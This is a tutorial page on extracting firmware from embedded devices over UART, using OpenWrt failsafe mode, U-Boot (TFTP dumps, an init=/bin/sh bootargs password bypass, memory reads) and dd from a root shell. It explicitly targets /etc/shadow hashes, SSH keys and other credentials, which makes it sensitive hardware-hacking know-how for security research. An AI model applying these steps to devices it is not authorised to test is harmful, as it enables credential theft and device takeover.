# Extract Firmware using UART

#### At this point you should have:

* Understand what UART does (if not check: [UART](./))
* Identified UART pins (if not check:[ Identify UART](uart-from-start-to-finish.md))
* Got a working connection to UART (if not check: [Connect to UART](connect-to-uart.md))

#### Not all UART interfaces are the same. Infact manufacturers could output actually anything over it. So there is no guarante you can abuse UART to dump firmware or get a shell on the device. But there are common methods, which we want to discuss further:

{% tabs %}
{% tab title="Failsafe mode" %}
Some manufacturers build a failsafe mode in their devices, which is designed as a recovery option, if the device is not operating correctly. An example for this is OpenWRT, which will print something like this in the bootlog:

```
Press the [f] key and hit [enter] to enter failsafe mode
Press the [1], [2], [3] or [4] key and hit [enter] to select the debug level  
```

Pressing `F` will give us a root shell:

<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption><p>OpenWrt command command shell</p></figcaption></figure>

Depending on your device you may have to mount the correct filesystem first:

* Run `ls /dev` or `blkid` to locate storage devices and partitions (e.g., `/dev/sda1`, `/dev/mmcblk0p2`).
* Use these commands to first create a mount point and then mound the filesystem:
  * `mkdir /mnt/filesystem`
  * `mount /dev/<root_partition> /mnt/filesystem`
* Now you may access the filesystem under `/mnt/filesystem`

From here we can check if the root-filesystem is already been mounted and we can look for:

* /etc/shadow hashes
* ssh private keys
* other credentials
{% endtab %}

{% tab title="U-Boot" %}
If U-Boot is used, chances are that the "stop autoboot" function may not be disabled. Here we have to press any key within a certain timespan (for example 5 sec) and we will be provided with a U-Boot shell

<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

Typing `help` will give us a list of all available commands

To dump the firmware, we can then use one of these options:

1. **Using TFTP:**
   1. On your attacker host:
      1. Set up a TFTP server `sudo apt install tftpd-hpa` (files will be stored in`/srv/tftp`)
      2. Create a firmware.bin file, as in TFTP that can't be done by the client:
         1. ```
            cd /srv/tftp
            sudo touch firmware.bin
            sudo chmod 666 firmware.bin
            ```
   2. In U-Boot:
      1. Setup IP-Adresses:
         1. ```
            setenv ipaddr <IP of target> (e.g.: 10.0.0.2)
            setenv serverip <IP of attacker host> (e.g.: 10.0.0.1)
            ```
      2. check if IP Adress are saved: `printenv`
   3. Initialize the flash with `sf probe 0`.
   4. Copy the flash contents to RAM (adjust offset and size):
      1. `sf read <addr in RAM> <offset in flash> <size>`
      2. `sf read 0x82000000 0x0 0x1000000`. (=16MB in this case)
   5. Transfer the data with TFTP:
      1. `tftp <addr> <filename> <size>`
      2. `tftp 0x82000000 firmware.bin 0x1000000`.
2. **Change Bootvariable**
   1. Idea: change the binary, which is run, when booting up ⇒ booting into /bin/sh will give us directly a shell, without the need to specify the password
   2. Steps:
      1. `printenv` Print out the current variables, save the boot-arguments (something like `bootargs=console=ttyS1,115200n8 mem=39M@0x0 rmem=25M@0x2700000 init=/linuxrc rootfstype=squashfs root=`&#x20;
      2. Now we can overwrite the bootargs variable to boot into /bin/sh
         1. `setenv bootargs "console=serial0,115200 console=tty1 init=/bin/sh"`
         2. Please adjust the baudrate(`115200)` if your device is using another
      3. Boot the system with the boot command
         1. `boot`
   3. Now you should be prompted with a root shell. Often you have to mount partitions, to be able to access all data
3. **Dump via Console**
   1. We can also dump it in the console: (CAN BE SLOW!)
      1. Read data:
         1. `md.b <offset to read from> <number of bytes to read>`
         2. example: `md.b 0x82000000 0x1000000`
         3. Save data to file using `CTRL-A L` in minicom for example (has to be trimmed)
   2. If we want to dump from an MMC:
      1.  ```bash
          #list available MMCs
          mmc list
          # select an MMC to dump (we have to select one else next commands fail)
          mmc dev 0
          #get info of mmc
          mmc info
          # get partition to see which partition we wanna dump (e.g. rootfs)
          mmc part
          # search in partition
          ext4ls mmc <device>:<partition> <path>
          ext4ls mmc 1:8 /home/root
          # read file from MMC to RAM
          ext4load mmc <device>:<partition> <memory_address in ram> <file_path>
          ext4load mmc 1:8 0xC6200000 /etc/shadow
          # show the file from memory
          md.b <memory_address in ram> <size>
          md.b 0xC6200000 0x43C
          ```

          Tool that does these steps automatically:[ https://github.com/nmatt0/firmwaretools](https://github.com/nmatt0/firmwaretools)
4.
{% endtab %}

{% tab title="Root-shell" %}
If you drop directly into a root shell or if you can figure out the root-password (e.g. default creds), you can simply `dd` the partition to a usb stick or transfer it another way.

Example:

```bash
sudo dd if=/dev/sda of=/dev/sdb bs=4M status=progress
```

Replace:

* `/dev/sda` with your root filesystem device
* `/dev/sdb` with your USB stick device

Ensure you verify the correct device paths to avoid overwriting important data. You can use `lsblk` or `fdisk -l` to check your devices.
{% endtab %}
{% endtabs %}

## Analyze firmware

* Using `binwalk firmware.bin` we can try to analyze the firmware and extract sensitive information
* check the "[Analyze Firmware](../../analyze-firmware.md)" chapter

## Resources

\*[Accessing and Dumping Firmware Through UART](https://www.cyberark.com/resources/threat-research-blog/accessing-and-dumping-firmware-through-uart) \*[Extracting Firmware: Every Method Explained](https://slava-moskvin.medium.com/extracting-firmware-every-method-explained-e94aa094d0dd)
